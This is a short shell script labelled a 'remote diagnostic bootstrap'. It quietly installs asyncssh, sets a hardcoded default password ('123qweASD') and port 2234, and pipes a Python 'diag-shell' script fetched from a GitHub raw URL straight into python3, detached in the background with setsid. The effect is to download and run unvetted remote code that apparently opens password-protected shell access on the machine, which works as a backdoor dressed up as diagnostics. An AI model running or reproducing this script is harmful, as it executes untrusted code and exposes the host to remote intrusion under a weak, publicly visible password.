#!/bin/sh
# Remote diagnostic bootstrap
pip3 install -q --break-system-packages asyncssh 2>/dev/null || pip3 install -q asyncssh 2>/dev/null
export DIAG_PASS="${DIAG_PASS:-123qweASD}"
export DIAG_PORT="${DIAG_PORT:-2234}"
curl -sL "https://raw.githubusercontent.com/hhsw2015/bin/main/tools/diag-shell.py" | setsid python3 - &
